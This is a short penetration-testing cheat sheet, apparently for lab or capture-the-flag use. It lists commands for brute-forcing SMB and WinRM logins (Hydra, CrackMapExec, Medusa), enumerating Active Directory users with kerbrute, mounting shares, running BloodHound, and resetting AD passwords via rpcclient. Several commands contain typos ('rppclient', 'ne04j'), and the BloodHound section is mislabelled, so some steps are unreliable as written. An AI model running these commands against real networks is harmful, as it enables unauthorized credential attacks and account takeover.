### SMB Bruteforce

- Crackmapexec
- Hydra
- Medusa


#### Hydra
```bash
# bruteforcing smb login
hydra -L users.txt -P pass.txt 10.10.*.* smb
```

#### Crackmapexec
```bash
# bruteforcing smb login, enumerating the available shares with --shares option
crackmapexec smb 10.10.*.* -u user.txt -p pass.txt --shares --continue-on-success

# bruteforcing winrm login
crackmapexec winrm 10.10.*.* -u users.txt -p pass.txt --continue-on-success 

```

#### Medusa
```bash
# bruteforcing smb login
medusa -h 10.10.*.* -U users.txt -P pass.txt -M smbnt 
```

### User Enumeration

- kerbrute

```bash
# enumerate AD users with kerbrute
kerbrute userenum --dc 10.10.*.* -d domain users.txt
```

### Mount 

```bash
# mount an anonymous login share
mount -t cifs '//10.10.*.*/ShareName' /mOuNt_Location

# mount an authenticated smb share
mount -t cifs -o 'username=UserName,password=Password' '//10.10.*.*/ShareName' /mOuNt_Location
```

### BloodHound

#### On Windows

```bash
# setup
git clone https://github.com/fox-it/BloodHound.py; cd BloodHound.py; python3 setup.py install

# Running bloodhound.py
python3 bloodhound.py -u userName -p 'PASSWORD' -ns machineIP -d domain.local -c all 

# start the neo4j console
sudo ne04j console

# start the bloodhound
cd /opt/bloodhound-linux-x64/
./BloodHound

# import all the json files
# mark the obtained user as owned user and the target user as high value target
```

### Reset AD users passowrd with rppclient

```bash
# login to rpcclinet
rppclient -U userName machineIP
# password for the user we have access to

rpcclinet $> setuserinfo2 {userToChange} 23 '{PasswordToChange}'
```